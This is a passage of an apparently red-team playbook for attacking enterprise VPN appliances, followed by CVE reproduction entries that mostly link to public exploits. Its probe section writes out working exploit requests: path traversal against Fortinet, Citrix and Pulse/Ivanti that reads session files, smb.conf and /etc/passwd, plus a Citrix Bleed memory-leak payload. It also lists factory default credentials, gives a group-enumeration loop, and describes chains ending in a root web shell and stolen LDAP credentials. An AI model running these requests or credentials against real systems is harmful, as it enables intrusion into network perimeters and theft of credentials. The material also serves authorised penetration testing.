## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Add `-as` (auto-scan) for broader vuln coverage but slower.

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Anti-patterns

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface

---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.

<!-- bughive-repro-start -->
## Steps to reproduce — CVE-2019-19781

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: citrix application_delivery_controller_firmware 10.5; citrix application_delivery_controller_firmware 11.1; citrix application_delivery_controller_firmware 12.0. NVD lists 10 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)]

### Input / trigger
- NVD characterizes the trigger as directory traversal. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47930.txt)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as directory traversal. Structured affected range: citrix application_delivery_controller_firmware 10.5. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47930.txt)]

### Public PoC (if any)
- EDB-47930 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47930.txt
- EDB-47901 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47901.sh
- EDB-47913 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47913.rb
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-19781
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/trustedsec/cve-2019-19781
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2019/CVE-2019-19781.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2018-0296

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco adaptive_security_appliance_software >= 9.1, < 9.1.7.29; cisco adaptive_security_appliance_software >= 9.2, < 9.2.4.33; cisco adaptive_security_appliance_software >= 9.3, < 9.4.4.18. NVD lists 13 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-0296)]
- Weakness: CWE-20, CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-0296)]

### Input / trigger
- NVD characterizes the trigger as denial of service. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-0296)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/44956.py)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as denial of service. Structured affected range: cisco adaptive_security_appliance_software >= 9.1, < 9.1.7.29. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-0296)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-0296)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/44956.py)]

### Public PoC (if any)
- EDB-44956 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/44956.py
- EDB-47220 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/47220.rb
- GHSA-listed: https://www.exploit-db.com/exploits/44956
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2018-0296
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/yassineaboukir/CVE-2018-0296
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2018/CVE-2018-0296.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/154017/Cisco-Adaptive-Security-Appliance-Path-Traversal.html
- NVD Exploit-tagged reference: https://www.exploit-db.com/exploits/44956/

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2020-3452

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco adaptive_security_appliance_software >= 9.6, < 9.6.4.42; cisco adaptive_security_appliance_software >= 9.8, < 9.8.4.20; cisco adaptive_security_appliance_software >= 9.9, < 9.9.2.74. NVD lists 12 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)]
- Weakness: CWE-20, CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)]

### Input / trigger
- NVD characterizes the trigger as path traversal. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as path traversal. Structured affected range: cisco adaptive_security_appliance_software >= 9.6, < 9.6.4.42. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt)]

### Public PoC (if any)
- EDB-48722 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt
- EDB-49262 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/49262.py
- EDB-48871 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48871.txt
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3452
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2020/CVE-2020-3452.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/158647/Cisco-Adaptive-Security-Appliance-Software-9.11-Local-File-Inclusion.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/159523/Cisco-ASA-FTD-9.6.4.42-Path-Traversal.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2023-20269

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco adaptive_security_appliance_software 9.8.1; cisco adaptive_security_appliance_software 9.8.1.5; cisco adaptive_security_appliance_software 9.8.1.7. NVD lists 246 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20269)]
- Weakness: CWE-288, CWE-863. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20269)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20269)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-20269)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20269)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20269)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-20269)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-20269

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-20481

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco secure_firewall_threat_defense 6.2.3; cisco secure_firewall_threat_defense 6.2.3.1; cisco secure_firewall_threat_defense 6.2.3.2. NVD lists 289 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-20481)]
- Weakness: CWE-772. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-20481)]

### Input / trigger
- NVD characterizes the trigger as denial of service. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-20481)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-20481)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as denial of service. Structured affected range: cisco secure_firewall_threat_defense 6.2.3. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-20481)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-20481)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-20481)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-20481

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2018-13379

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: fortinet fortiproxy < 1.2.9; fortinet fortiproxy 2.0.0; fortinet fortios >= 5.4.6, < 5.4.13. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-13379)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-13379)]

### Input / trigger
- NVD characterizes the trigger as path traversal. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-13379)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/47288.py)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as path traversal. Structured affected range: fortinet fortiproxy < 1.2.9. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-13379)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2018-13379)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/47288.py)]

### Public PoC (if any)
- EDB-47288 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/47288.py
- EDB-47287 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/47287.rb
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2018-13379
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/milo2012/CVE-2018-13379
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2018/CVE-2018-13379.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2022-42475

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: fortinet fortios >= 5.0.0, <= 5.0.14; fortinet fortios >= 5.2.0, <= 5.2.15; fortinet fortios >= 5.4.0, <= 5.4.13. NVD lists 18 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)]
- Weakness: CWE-197, CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)]

### Input / trigger
- NVD characterizes the trigger as arbitrary code. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)] [[nvd](https://fortiguard.com/psirt/FG-IR-22-398)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code. Structured affected range: fortinet fortios >= 5.0.0, <= 5.0.14. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)] [[nvd](https://fortiguard.com/psirt/FG-IR-22-398)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2022-42475
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/scrt/cve-2022-42475
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2022/CVE-2022-42475.json
- NVD Exploit-tagged reference: https://fortiguard.com/psirt/FG-IR-22-398

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2023-27997

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: fortinet fortiproxy >= 1.1.0, <= 1.1.6; fortinet fortiproxy >= 1.2.0, <= 1.2.13; fortinet fortiproxy >= 2.0.0, <= 2.0.12. NVD lists 23 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-27997)]
- Weakness: CWE-122, CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-27997)]

### Input / trigger
- NVD characterizes the trigger as arbitrary code. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-27997)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-27997)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code. Structured affected range: fortinet fortiproxy >= 1.1.0, <= 1.1.6. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-27997)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-27997)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-27997)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-27997
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/BishopFox/CVE-2023-27997-check
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2023/CVE-2023-27997.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-21762

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: fortinet fortiproxy >= 1.0.0, < 2.0.14; fortinet fortiproxy >= 7.0.0, < 7.0.15; fortinet fortiproxy >= 7.2.0, < 7.2.9. NVD lists 10 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21762)]
- Weakness: CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21762)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21762)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-21762)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21762)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-21762)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-21762)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-21762
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/h4x0r-dz/CVE-2024-21762
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2024/CVE-2024-21762.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-55591

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: fortinet fortiproxy >= 7.0.0, < 7.0.20; fortinet fortiproxy >= 7.2.0, < 7.2.13; fortinet fortios >= 7.0.0, < 7.0.17. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-55591)]
- Weakness: CWE-288. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-55591)]

### Input / trigger
- NVD characterizes the trigger as authentication bypass. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-55591)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-55591)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as authentication bypass. Structured affected range: fortinet fortiproxy >= 7.0.0, < 7.0.20. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-55591)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-55591)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-55591)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-55591
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/watchtowrlabs/fortios-auth-bypass-poc-CVE-2024-55591
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2024/CVE-2024-55591.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2022-27518

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: citrix application_delivery_controller_firmware >= 12.1, < 12.1-55.291; citrix application_delivery_controller_firmware >= 12.1, < 12.1-65.25; citrix application_delivery_controller_firmware >= 13.0, < 13.0-58.32. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-27518)]
- Weakness: CWE-664. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-27518)]

### Input / trigger
- NVD characterizes the trigger as arbitrary code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-27518)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2022-27518)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code execution. Structured affected range: citrix application_delivery_controller_firmware >= 12.1, < 12.1-55.291. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-27518)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-27518)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2022-27518)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2022-27518
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/dolby360/CVE-2022-27518_POC
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2022/CVE-2022-27518.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2023-3519

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: citrix netscaler_application_delivery_controller >= 12.1, < 12.1-55.297; citrix netscaler_application_delivery_controller >= 13.0, < 13.0-91.13; citrix netscaler_application_delivery_controller >= 13.1, < 13.1-37.159. NVD lists 6 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-3519)]
- Weakness: CWE-94. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-3519)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-3519)] [[nvd](http://packetstormsecurity.com/files/173997/Citrix-ADC-NetScaler-Remote-Code-Execution.html)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: citrix netscaler_application_delivery_controller >= 12.1, < 12.1-55.297. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-3519)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-3519)] [[nvd](http://packetstormsecurity.com/files/173997/Citrix-ADC-NetScaler-Remote-Code-Execution.html)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-3519
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/BishopFox/CVE-2023-3519
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2023/CVE-2023-3519.json
